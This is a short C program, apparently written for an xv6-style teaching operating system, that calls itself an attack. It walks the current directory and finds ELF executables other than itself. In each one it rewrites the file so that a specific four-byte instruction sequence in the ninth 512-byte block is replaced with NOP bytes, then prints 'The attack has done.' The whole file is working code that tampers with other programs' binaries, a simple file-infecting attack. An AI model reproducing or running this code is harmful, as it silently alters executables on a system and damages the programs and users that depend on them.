#include "stdio.h"
#include "string.h"

int main(int argc, char * argv[]) {
    int num = 0;
    char bufw[] = "\x90\x90\x90\x90";
    int fd, fd2, dir;
    int n;
    char dir_buf[40];
    char filename[20];
    char bufr[512];
    int i = 20;
    dir = open(".", O_RDWR);

    for(int j = 0; j < 7; j ++) {
        n = read(dir, dir_buf, 16);
	printf("%s\n",&dir_buf[4]);
    }
    while(i) {
        if(dir_buf[4] != 0) {                                                           
            //printf("Find a file with filename: %s\n", &dir_buf[4]);
            if(strcmp(&dir_buf[4], "attack") == 0) {
                //i --;
		printf("%s cant be changed\n",&dir_buf[4]);
                n = read(dir, dir_buf, 16);
                continue;
            }
            fd = open(&dir_buf[4], O_RDWR);
            read(fd, bufr, 4);
         
            if(bufr[0] == '\x7f' && bufr[1] == '\x45' ) {//&& strcmp(&dir_buf[4], "testa") == 0
                printf("Find an ELF file %d! The filename is %s\n", ++num, &dir_buf[4]);
                fd2 = open(&dir_buf[4], O_RDWR);
                for(int num = 0; num < 9; num ++) {
                    if(num == 0) {
                        n = read(fd, bufr+4, 508);
                    } else {
                        n = read(fd, bufr, 512);
                    }
                    if(num != 8) {
                        write(fd2, bufr, 512);
                    } else {
                        int index = 0;
                        while(bufr[index] != '\x8d' || bufr[index + 1] != '\x61' || bufr[index + 2] != '\xfc' || bufr[index + 3] != '\xc3') {
                            index ++;
                        }
                        for(int j = index; j < index + 4; j ++) {
                            bufr[j] = bufw[j - index];
                        }
                        write(fd2, bufr, n);
                    }
                }
                close(fd2);
            }
            close(fd);
        }
	n = read(dir, dir_buf, 16);
        i --;
    }
    	close(dir);
	printf("The attack has done.\n");
    return 0;
}
